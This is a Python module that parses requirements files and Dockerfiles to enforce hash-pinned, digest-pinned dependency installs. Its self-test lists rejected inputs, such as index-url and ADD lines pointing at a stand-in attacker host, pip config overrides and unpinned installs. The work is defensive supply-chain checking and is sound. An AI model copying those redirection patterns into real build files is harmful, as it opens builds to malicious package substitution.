"""Strict parsers shared by pin_check.py (offline) and provenance.py (online).

Both gates must see exactly what pip and BuildKit act on, so anything they would honour
that these parsers do not understand is an error, never a skipped line.

Requirements files (`requirements*.txt` under broker/), after joining `\\` continuations:
  * blank lines and `#` comments;
  * `name==version` followed by one or more `--hash=sha256:<64 lowercase hex>`.
  Everything else is rejected: extras, direct URLs, markers, other operators, option lines
  (`-r`, `-c`, `-e`, `--index-url`, `--extra-index-url`, `--find-links`, ...), other hash
  algorithms or spellings, uppercase digests.

Dockerfiles (`Dockerfile`, `Dockerfile.*`, `*.Dockerfile`, `Containerfile*`):
  * no parser directives (`# syntax=` would run an unpinned BuildKit frontend);
  * no `ADD`, `ONBUILD`, `RUN --<flag>`, or `COPY --from=` anything but an earlier stage;
  * no pip configuration (`PIP_*`, `pip.conf`);
  * every Python package install is exactly
      pip install --no-cache-dir --no-deps --require-hashes --only-binary=:all: -r <path>
    and `<path>` is the destination of a `COPY` of one checked requirements file.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass
from pathlib import Path

BROKER = Path(__file__).resolve().parents[1]

NAME = r"[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?"
PIN_RE = re.compile(rf"^({NAME})==([0-9][0-9A-Za-z.+!-]*)$")
HASH_RE = re.compile(r"^--hash=sha256:([0-9a-f]{64})$")
REQ_NAME_RE = re.compile(r"^requirements[A-Za-z0-9_.-]*\.txt$")
FROM_RE = re.compile(r"^(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?\s*$", re.I)
PINNED_RE = re.compile(r"^[\w./:-]+@sha256:[0-9a-f]{64}$")
DIRECTIVE_RE = re.compile(r"^\s*#\s*(syntax|escape)\s*=", re.I)
INSTALLER_RE = re.compile(r"(?<![\w-])(pip[0-9.]*|uv|pipx|poetry|pdm|easy_install|conda|mamba|micromamba)(?![\w-])")
PIP_CONFIG_RE = re.compile(r"\bPIP_[A-Z_]+|pip\.conf|pydistutils")
CANONICAL = ["pip", "install", "--no-cache-dir", "--no-deps", "--require-hashes", "--only-binary=:all:", "-r"]
CONTROL = {"&&", "||", ";", "|", "&", ";;", "(", ")"}


class SupplyChainError(ValueError):
    pass


def norm(name: str) -> str:
    return re.sub(r"[-_.]+", "-", name).lower()


def rel(p: Path) -> str:
    try:
        return str(p.relative_to(BROKER.parent))
    except ValueError:
        return p.name


def _excluded(p: Path) -> bool:
    return ".work" in p.parts or "__pycache__" in p.parts


def requirement_files() -> list[Path]:
    return sorted(p for p in BROKER.rglob("requirements*.txt") if not _excluded(p))


def dockerfiles() -> list[Path]:
    pats = ("Dockerfile", "Dockerfile.*", "*.Dockerfile", "Containerfile", "Containerfile.*", "*.Containerfile")
    return sorted({p for pat in pats for p in BROKER.rglob(pat) if p.is_file() and not _excluded(p)})


def parse_requirements(path: Path) -> list[tuple[int, str, str, list[str]]]:
    """[(line, normalised name, version, [sha256, ...])]. Raises on anything unexpected."""
    pins, seen, buf, start = [], set(), "", 0
    lines = path.read_text().splitlines() + [""]
    for n, raw in enumerate(lines, 1):
        if buf and n == len(lines):
            raise SupplyChainError(f"{rel(path)}:{start}: dangling continuation at end of file")
        stripped = raw.strip()
        if not buf and (not stripped or stripped.startswith("#")):
            continue
        if not buf:
            start = n
        line = re.sub(r"\s+#.*$", "", raw)
        if line.rstrip().endswith("\\"):
            buf += line.rstrip()[:-1] + " "
            continue
        buf += line
        tokens, buf = buf.split(), ""
        if not tokens:
            raise SupplyChainError(f"{rel(path)}:{start}: dangling continuation")
        m = PIN_RE.match(tokens[0])
        if not m:
            raise SupplyChainError(f"{rel(path)}:{start}: not a plain `name==version` pin: {tokens[0][:60]!r}")
        hashes = []
        for t in tokens[1:]:
            h = HASH_RE.match(t)
            if not h:
                raise SupplyChainError(f"{rel(path)}:{start}: unexpected token {t[:60]!r} "
                                       "(only --hash=sha256:<64 lowercase hex> may follow a pin)")
            hashes.append(h.group(1))
        if not hashes:
            raise SupplyChainError(f"{rel(path)}:{start}: {m.group(1)} has no --hash")
        name = norm(m.group(1))
        if name in seen:
            raise SupplyChainError(f"{rel(path)}:{start}: {name} is pinned twice")
        seen.add(name)
        pins.append((start, name, m.group(2), hashes))
    return pins


def _instructions(path: Path):
    """Yield (line, INSTRUCTION, args) with continuations joined as BuildKit does."""
    buf, start = "", 0
    for n, raw in enumerate(path.read_text().splitlines() + [""], 1):
        if DIRECTIVE_RE.match(raw):
            raise SupplyChainError(f"{rel(path)}:{n}: parser directives are not allowed "
                                   "(`# syntax=` runs an unpinned BuildKit frontend)")
        s = raw.strip()
        if s.startswith("#") or (buf and not s):
            continue
        if not buf:
            if not s:
                continue
            start = n
        if s.endswith("\\"):
            buf += s[:-1] + " "
            continue
        buf += s
        word, _, args = buf.partition(" ")
        buf = ""
        yield start, word.upper(), args.strip()


@dataclass
class Install:
    dockerfile: Path
    line: int
    requirements: Path
    base: str


def _commands(script: str) -> list[list[str]]:
    lex = shlex.shlex(script, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    cmds, cur = [], []
    for tok in lex:
        if tok in CONTROL:
            if cur:
                cmds.append(cur)
            cur = []
        else:
            cur.append(tok)
    if cur:
        cmds.append(cur)
    return cmds


def _resolve_copy_src(df: Path, src: str) -> Path | None:
    if not REQ_NAME_RE.match(Path(src).name) or ".." in Path(src).parts or re.search(r"[*?\[$]", src):
        return None
    # Build contexts used by build.sh/test.sh: the Dockerfile's directory, else broker/.
    for ctx in (df.parent, BROKER):
        p = (ctx / src).resolve()
        if p.is_file():
            return p
    return None


def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list[str]]:
    """Installs found and errors (as `path:line: message`)."""
    errors: list[str] = []
    installs: list[Install] = []
    stages: dict[str, str] = {}
    copies: dict[str, Path | None] = {}
    base = ""
    loc = rel(df)
    try:
        instrs = list(_instructions(df))
    except SupplyChainError as e:
        return [], [str(e)]
    for n, op, args in instrs:
        if PIP_CONFIG_RE.search(args):
            errors.append(f"{loc}:{n}: pip configuration in a Dockerfile is not allowed")
        if op in ("ADD", "ONBUILD"):
            errors.append(f"{loc}:{n}: {op} is not allowed (use COPY from the build context)")
        elif op == "FROM":
            m = FROM_RE.match(args)
            if not m:
                errors.append(f"{loc}:{n}: unparsed FROM {args!r}")
                continue
            image, alias = m.group(1), m.group(2)
            if image.lower() in stages:
                base = stages[image.lower()]
            else:
                base = image
                if not PINNED_RE.match(image):
                    errors.append(f"{loc}:{n}: base image {image!r} is not pinned by digest")
                elif image not in image_refs:
                    errors.append(f"{loc}:{n}: base image {image!r} is not in broker/deps.json")
            if alias:
                stages[alias.lower()] = base
        elif op == "COPY":
            parts = args.split()
            flags = [p for p in parts if p.startswith("--")]
            rest = [p for p in parts if not p.startswith("--")]
            for f in flags:
                if f.lower().startswith("--from=") and f.split("=", 1)[1].lower() not in stages:
                    errors.append(f"{loc}:{n}: COPY {f} must name an earlier build stage")
            if not any(f.lower().startswith("--from=") for f in flags) and len(rest) == 2:
                copies[rest[1]] = _resolve_copy_src(df, rest[0])
        elif op == "RUN":
            if args.startswith("--"):
                errors.append(f"{loc}:{n}: RUN flags (--mount, --network, --security) are not allowed")
            if args.startswith("["):
                errors.append(f"{loc}:{n}: exec-form RUN is not allowed (it cannot be checked)")
                continue
            try:
                cmds = _commands(args)
            except ValueError as e:
                errors.append(f"{loc}:{n}: cannot parse RUN: {e}")
                continue
            for cmd in cmds:
                while cmd and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", cmd[0]):
                    cmd = cmd[1:]
                if cmd[:-1] == CANONICAL:
                    target = copies.get(cmd[-1])
                    if target is None:
                        errors.append(f"{loc}:{n}: -r {cmd[-1]} is not the destination of a COPY of one "
                                      "checked requirements*.txt file")
                    else:
                        installs.append(Install(df, n, target, base))
                elif any(INSTALLER_RE.search(t) for t in cmd):
                    errors.append(f"{loc}:{n}: Python package install must be exactly "
                                  f"`{' '.join(CANONICAL)} <path>`: {' '.join(cmd)[:120]!r}")
    return installs, errors


def verifier_base() -> str:
    """The interpreter the provenance verifier runs on (tools/attest/Dockerfile)."""
    for _, op, args in _instructions(BROKER / "tools" / "attest" / "Dockerfile"):
        if op == "FROM":
            return args.split()[0]
    raise SupplyChainError("tools/attest/Dockerfile has no FROM")


def install_targets(image_refs: set[str]) -> tuple[dict[Path, set[str]], list[str]]:
    """{requirements file: {base images it is installed into}}, errors."""
    targets: dict[Path, set[str]] = {}
    errors: list[str] = []
    for df in dockerfiles():
        installs, errs = scan_dockerfile(df, image_refs)
        errors += errs
        for i in installs:
            targets.setdefault(i.requirements, set()).add(i.base)
    return targets, errors


def self_test() -> list[str]:
    """Every form pip or BuildKit would act on but the gates must not let through
    (security review 20261104-broker-dependency-provenance, alerts 1, 2 and 4)."""
    import tempfile

    h = "a" * 64
    good = "b" * 64
    req_bad = [
        f"pkg[x]==1.0 --hash=sha256:{h}",
        f"pkg == 1.0 --hash=sha256:{h}",
        f"pkg @ https://evil.example.test/pkg-1.0-py3-none-any.whl --hash=sha256:{h}",
        "-r other.txt", "-c constraints.txt", "-e .",
        "--index-url https://evil.example.test/simple",
        "--extra-index-url https://evil.example.test/simple",
        "--find-links https://evil.example.test/",
        "-i https://evil.example.test/simple",
        f"--hash=sha256:{h}",
        f"pkg==1.0 --hash=sha512:{h}{h}",
        f"pkg==1.0 --hash=sha256:{h.upper()}",
        f"pkg==1.0 --hash sha256:{h}",
        f"pkg==1.0 --hash=sha256:{h} --hash=sha384:{h[:48]}{h[:48]}",
        f"pkg==1.0 ; python_version > '3' --hash=sha256:{h}",
        f"pkg>=1.0 --hash=sha256:{h}",
        f"pkg===1.0 --hash=sha256:{h}",
        "pkg==1.0",
        f"pkg==1.0 \\\n    --hash=sha256:{h} \\",
        f"pkg==1.0 --hash=sha256:{h}\npkg==1.0 --hash=sha256:{good}",
        f"pkg==1.0 --hash=sha256:{h} --no-binary=:all:",
    ]
    req_good = [
        f"pkg==1.0 --hash=sha256:{h}",
        f"# comment\npkg==1.0 \\\n    --hash=sha256:{h} \\\n    --hash=sha256:{good}\n    # via other\n",
        f"Pkg.Name_x==2.0rc1 --hash=sha256:{h}  # trailing comment",
    ]
    ref = f"python:3.13-slim-trixie@sha256:{h}"
    canon = " ".join(CANONICAL)
    head = f"FROM {ref} AS base\nCOPY requirements.txt /r.txt\n"
    df_bad = [
        "# syntax=docker/dockerfile:1\n" + head + f"RUN {canon} /r.txt",
        "#escape=`\n" + head,
        head + "ADD https://evil.example.test/x /x",
        head + f"COPY --from=other@sha256:{h} /x /x",
        head + f"RUN --mount=type=bind,from=other@sha256:{h},target=/m true",
        head + "RUN pip install --require-hashes -r /r.txt",
        head + "RUN pip \\\n install --require-hashes -r /r.txt",
        head + f"RUN {canon} /r.txt --index-url https://evil.example.test/simple",
        head + f"RUN {canon} /elsewhere.txt",
        head + "RUN uv pip install pkg",
        head + "RUN python3 -m pip install pkg",
        head + "RUN sh -c 'pip install pkg'",
        head + "RUN true && pip3.13 install pkg",
        head + "ENV PIP_INDEX_URL=https://evil.example.test/simple",
        head + "COPY pip.conf /etc/pip.conf",
        head + 'RUN ["pip", "install", "pkg"]',
        head + "ONBUILD RUN true",
        "FROM python:3.13-slim-trixie\n",
        f"FROM unregistered@sha256:{h}\n",
    ]
    df_good = [
        head + f"RUN {canon} /r.txt \\\n && apt-get install -y python3-pip\nFROM base AS t\nCOPY --from=base /x /y",
    ]
    failures = []
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        (root / "requirements.txt").write_text(f"pkg==1.0 --hash=sha256:{h}\n")
        for i, text in enumerate(req_bad + req_good):
            p = root / f"requirements-{i}.txt"
            p.write_text(text + "\n")
            try:
                parse_requirements(p)
                ok = True
            except SupplyChainError:
                ok = False
            if ok != (text in req_good):
                failures.append(f"requirements vector {'accepted' if ok else 'rejected'}: {text!r}")
        for i, text in enumerate(df_bad + df_good):
            p = root / f"Dockerfile.{i}"
            p.write_text(text + "\n")
            installs, errors = scan_dockerfile(p, {ref})
            if (not errors) != (text in df_good) or (text in df_good and len(installs) != 1):
                failures.append(f"Dockerfile vector {'accepted' if not errors else 'rejected'}: {text!r} {errors}")
    return failures
